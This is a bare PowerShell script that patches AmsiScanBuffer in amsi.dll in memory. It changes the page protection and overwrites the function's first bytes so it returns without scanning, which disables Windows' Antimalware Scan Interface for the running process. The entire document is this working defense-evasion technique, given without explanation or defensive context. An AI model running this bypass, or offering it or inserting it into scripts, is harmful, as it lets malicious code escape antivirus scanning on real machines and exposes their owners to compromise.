$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$DllAddr = [Win32]::LoadLibrary("amsi.dll")
$FuncAddr = [Win32]::GetProcAddress($DllAddr, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($FuncAddr, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $FuncAddr, $Patch.Length)
